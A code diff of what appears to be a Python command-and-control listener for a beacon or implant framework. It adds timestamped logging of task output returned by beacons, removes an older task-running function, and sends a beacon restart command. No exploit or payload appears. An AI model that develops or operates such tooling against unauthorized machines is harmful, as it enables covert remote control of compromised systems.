@@ -14,6 +14,7 @@ from sys import exit, argv,exc_info
 from sys import path as sys_path
 from signal import SIGTERM
 import tasker,base64
+from datetime import datetime
 
 VERBOSE = True
 DEBUG = True
@@ -146,6 +147,11 @@ def change_beacon_port(conn):
     elif ans == "2":
         ans = print_question("Enter new callback port")
         send_data(conn, "[PORT]{}".format(ans))
+
+def get_current_time():
+    now = datetime.now()
+    current_time = now.strftime("%Y-%H:%M:%S")
+    return current_time
 
 def query_beacon_config(conn):
     send_data(conn, "[BEACON]?")
@@ -312,17 +318,6 @@ def load_tasks(task_file):
             if task != "\n":
                 temp_list.append(task)
     return temp_list
-
-def run_tasklist(conn, task_list, save_file_name):
-    with open(save_file_name, 'w') as save_file:
-        for task in task_list:
-            send_data(conn, task)
-            output = listen_for_data(conn)
-            section = "*****TASK*****\n{}".format(task)
-            save_file.write(section + "\n")
-            section = "*****OUTPUT*****\n{}".format(output)
-            save_file.write(section + "\n")
-    print_good("Tasks Complete!  Saved Here: {}".format(save_file_name))
 
 def delete_task_file(task_file_name):
     try:
@@ -497,7 +492,13 @@ def listen():
                     task_list = load_tasks(uuid)
                     for task in task_list:
                         send_data(conn, task)
-                        listen_for_data(conn)
+                        data = listen_for_data(conn,"save")
+                        save_file = "task-output-" + uuid + ".txt"
+                        with open(path.join("tasks", save_file),'a+',encoding='utf8') as f:
+                            f.write("*********************\n")
+                            f.write(get_current_time() + '\n' + data + '\n')
+                            f.write("*********************\n")
+                    send_data(conn, "[BEACON]START")
                     conn.shutdown(socket.SHUT_RDWR)
                     conn.close()
                 else:
